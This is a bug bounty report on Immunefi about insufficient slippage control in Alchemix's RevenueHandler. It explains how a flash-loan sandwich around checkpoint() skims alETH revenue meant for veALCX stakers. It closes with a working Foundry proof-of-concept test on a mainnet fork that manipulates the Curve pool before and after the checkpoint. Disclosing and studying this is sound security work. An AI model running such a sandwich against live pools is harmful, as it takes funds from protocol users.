# 30682 - \[SC - Critical] Insufficient slippage control in RevenueHandler...

## Insufficient slippage control in RevenueHandler leads to loss of funds

Submitted on May 4th 2024 at 10:35:52 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30682

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Brief

Due to insufficient slippage control, an attacker can sandwich Alchemix revenue checkpoints with a flash loan, stealing a portion of the tokens that should be distributed to veALCX stakers.

## Description

When the poolAdapter is set, the revenue token (`WETH` for example) is swapped in a Curve pool for an "*alchemic-token*" (`alETH` for instance) during each revenue checkpoint.

The flagged logic is inside the `_melt` function of the *RevenueHandler.sol* smart contract:

> **The comments in the code snippet are from the Alchemix team.**

```javascript
/*  
    minimumAmountOut == inputAmount
    Here we are making the assumption that the price of the alAsset will always be at or below the price of the revenue token.
    This is currently a safe assumption since this imbalance has always held true for alUSD and alETH since their inceptions.
*/
return
    IPoolAdapter(poolAdapter).melt(
        revenueToken,
        tokenConfig.debtToken,
        revenueTokenBalance,
        revenueTokenBalance
    );
```

> Link to the snippet of code: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol?utm\\_source=immunefi#L275-L295>

The comments make a correct assumption about the price of "alAssets", but the code implementation does not protect the protocol from losses due to sandwich attacks.

### Vulnerable Implementation

The pseudo-code of the `_melt(address revenueToken)` implementation that uses the `CurveEthPoolAdapter` is:

1- Swap the `revenueToken` (*WETH*) for *ETH* by calling `WETH.withdraw(_amount)`

2- Swap the *ETH* for the `debtToken` (*alETH*).

3- Enforce that the amount of `debtToken` we receive is equal to or bigger than the same amount of `revenueToken` we sent.

```
    ┌───────────────────┐               
    │Swap $WETH for $ETH│               
    └─────────┬─────────┘               
   ┌──────────▽─────────┐               
   │Swap $ETH for $alETH│               
   └──────────┬─────────┘               
  ____________▽____________             
 ╱                         ╲    ┌──────┐
╱ Do we receive less $alETH ╲___│REVERT│
╲ than the $ETH we sent?    ╱yes└──────┘
 ╲_________________________╱            
              │no                       
          ┌───▽──┐                      
          │SUCESS│                      
          └──────┘                      

```

> Hopefully flowcharts are rendered correctly, we will see.

Alchemix's test suite runs at block number *17133822*.

> This can be verified in the `alchemix-v2-dao/Makefile` file.

The eth/alETH exchange rate in the curve pool when running the test suite is **10.00 eth** => **10.12 alETH**

> This can be verified by adding to the `testSlippageCheckpointETH` function of the test file `alchemix-v2-dao/src/test/RevenueHandler.t.sol` the 2 lines below and running the test at block number 17133822:

```
uint256 exchange_rate = alethCpa.getDy(address(weth), aleth, 10e18);
console2.log("eth/alETH exchange_rate", exchange_rate);
```

Alchemix created tests simulating a checkpoint for **10 WETH** of revenue.

Under these market conditions the *RevenueHandler* should receive **10.12 alETH**.

Because the implementation of the code only cares for receiving at least **10 alETH**, it is possible to manipulate the price of the pool with a flash loan and sandwich attack so the *RevenueHandler* receives exactly **10 alETH** and the attacker profits 1.14 % of the protocol's revenue during that epoch (**0.114 ETH**).

### Increasing Economic Damage

With the exchange rate of `10 ETH` == `10.12 alETH` used in the tests, we prove in a PoC attached to this report that losses are \~1.14% of the protocol's revenue every epoch.

Currently, the exchange rate in Curve is `10 ETH` == `11.02 alETH`.

Exploiting this attack vector in current market conditions for a `10 ETH` protocol revenue leads to losing close to **\~9.26% of protocol revenue** (*1.02 alETH*).

> The protocol should receive *11.02 alETH* but only receives *10 alETH*.

The economic damage of this attack vector keeps increasing every time the price of *alETH* decreases.

### Requirements

Anyone can call `RevenueHandler.checkpoint()` so flash loans can be used to fund the attack. No capital or permissions are required to execute it.

### Impact Details

Loss of funds.

### Proof of Concept

We modified your current `testCheckpointETH()` in `alchemix-v2-dao/src/test/RevenueHandler.t.sol`, adding the price manipulation before and after the checkpoint, to demonstrate the impact of the exploit.

Remember to run the code with the correct block number (the one used in your tests: 17133822)

We run the test executing:

```
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/{API_KEY} --match-test testSlippageCheckpointETH --fork-block-number 17133822 -vv
```

> Replace {API\_KEY} with your API key.

The code for the test:

```javascript
    function testSlippageCheckpointETH() external {

        address[] memory alethCrvTokenIds = new address[](2);
        alethCrvTokenIds[0] = address(weth); // eth
        alethCrvTokenIds[1] = aleth;

        CurveEthPoolAdapter alethCpa = new CurveEthPoolAdapter(alethcrv, alethCrvTokenIds, address(weth));

        revenueHandler.addRevenueToken(address(weth));
        revenueHandler.setDebtToken(address(weth), aleth);
        revenueHandler.setPoolAdapter(address(weth), address(alethCpa));

        uint256 revAmt = 10e18;
        _accrueRevenue(address(weth), revAmt);

        // --------------------------------------------------------------------------
        // | Attack starts: Manipulate price pool by front-running the checkpoint() |
        // --------------------------------------------------------------------------

        // Get address of attacker
        address attacker = address(0x123);
        
        // Fund attacker
        uint256 inputAmount = 1500e18;
        deal(attacker,inputAmount);
        
        // Record attacker's ETH balance
        uint256 attackerETHBefore = attacker.balance;

        // Manipulate the price of the pool
        hevm.prank(attacker);
        ICurveStableSwap(alethcrv).exchange{ value: inputAmount }(
            0,
            1,
            inputAmount,
            0,
            attacker
        );

        // --------------------------------------------------------------------------
        // | Checkpoint is executed                                                 |
        // --------------------------------------------------------------------------

        uint256 balBefore = IERC20(aleth).balanceOf(address(revenueHandler));
        assertEq(balBefore, 0);
        revenueHandler.checkpoint();
        uint256 balAfter = IERC20(aleth).balanceOf(address(revenueHandler));
        assertApproxEq(revAmt, balAfter, revAmt / 30);
        

        // --------------------------------------------------------------------------
        // | Attack starts: Restore the pool to his original state                  |
        // --------------------------------------------------------------------------

        inputAmount = IERC20(aleth).balanceOf(attacker);

        // Approve the pool to spend the aleth
        hevm.prank(attacker);
        IERC20(aleth).approve(address(alethcrv), inputAmount);

        // Restore the price of the pool
        hevm.prank(attacker);
        ICurveStableSwap(alethcrv).exchange(
            1,
            0,
            inputAmount,
            0,
            attacker
        );

        // Log attacker profit in ETH
        uint256 attackerETHAfetr = attacker.balance;
        uint256 profit = attackerETHBefore - attackerETHAfetr;
        console2.log("attacker profit in ETH", profit);
        // - attacker profit in ETH 1141830491000656247 wei of ETH ~= 0.114 ETH

    }

```
